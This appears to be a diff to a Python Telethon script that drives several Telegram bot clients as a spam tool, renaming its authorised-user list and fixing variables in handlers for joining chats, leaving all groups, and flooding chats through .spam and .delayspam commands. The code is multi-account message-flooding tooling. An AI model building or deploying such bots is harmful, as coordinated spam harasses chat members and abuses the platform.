@@ -60,10 +60,9 @@ ddk = ""
 
 
 que = {}
-
-GOD_USERS = [829943136]
+SMEX_USERS = [829943136]
 for x in SUDO:
-    GOD_USERS.append(x)
+    SMEX_USERS.append(x)
 
 
 async def start_Ustad():
@@ -86,7 +85,7 @@ async def start_Ustad():
             await idk.start()
             botme = await idk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             idk = "smex"
             print(e)
@@ -108,7 +107,7 @@ async def start_Ustad():
             await ydk.start()
             botme = await ydk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -129,7 +128,7 @@ async def start_Ustad():
             await wdk.start()
             botme = await wdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -150,7 +149,7 @@ async def start_Ustad():
             await hdk.start()
             botme = await hdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -171,7 +170,7 @@ async def start_Ustad():
             await sdk.start()
             botme = await sdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -192,7 +191,7 @@ async def start_Ustad():
             await adk.start()
             botme = await adk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -213,7 +212,7 @@ async def start_Ustad():
             await bdk.start()
             botme = await bdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -234,7 +233,7 @@ async def start_Ustad():
             await cdk.start()
             botme = await cdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -255,7 +254,7 @@ async def start_Ustad():
             await ddk.start()
             botme = await ddk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -276,7 +275,7 @@ async def start_Ustad():
             await edk.start()
             botme = await edk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            GOD_USERS.append(botid)
+            SMEX_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -321,7 +320,7 @@ async def gifspam(e, god):
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
-    if e.sender_id in GOD_USERS:
+    if e.sender_id in SMEX_USERS:
         Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 6:
             bc = Ustad[0]
@@ -348,7 +347,7 @@ async def _(e):
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
-    if e.sender_id in GOD_USERS:
+    if e.sender_id in SMEX_USERS:
         Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 7:
             bc = Ustad[0]
@@ -375,7 +374,7 @@ async def _(e):
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))        
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
-    if e.sender_id in GOD_USERS:
+    if e.sender_id in SMEX_USERS:
         jatt = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 7:
             bc = jatt[0]
@@ -405,7 +404,7 @@ from telethon.tl.functions.channels import LeaveChannelRequest as leave
 @edk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
 async def f(event):
-    if event.sender_id in GOD_USERS:
+    if event.sender_id in SMEX_USERS:
        async for x in idk.iter_dialogs():
          if x.is_group:
            await idk(leave(x.id))           
@@ -426,7 +425,7 @@ async def f(event):
 async def spam(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
     error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
-    if e.sender_id in GOD_USERS:
+    if e.sender_id in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None)
         Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
@@ -443,9 +442,9 @@ async def spam(e):
                 return await e.reply(error, parse_mode=None, link_preview=None)
             for _ in range(counter):
                 smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
-                await gifspam(e, god)
+                await gifspam(e, smex)
         elif e.reply_to_msg_id and smex.text:
-            message = god.text
+            message = smex.text
             counter = int(Ustad[0])
             if counter > 100:
                 return await e.reply(error, parse_mode=None, link_preview=None)
@@ -466,7 +465,7 @@ async def spam(e):
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
 async def spam(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
-    if e.sender_id in GOD_USERS:
+    if e.sender_id in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None)
         smex = await e.get_reply_message()
@@ -483,7 +482,7 @@ async def spam(e):
                     else:
                         await e.client.send_message(e.chat_id, message)
                     await asyncio.sleep(sleeptime)
-        elif e.reply_to_msg_id and god.media:
+        elif e.reply_to_msg_id and smex.media:
             counter = int(Ustadsexy[0])
             sleeptime = float(Ustad[0])
             for _ in range(counter):
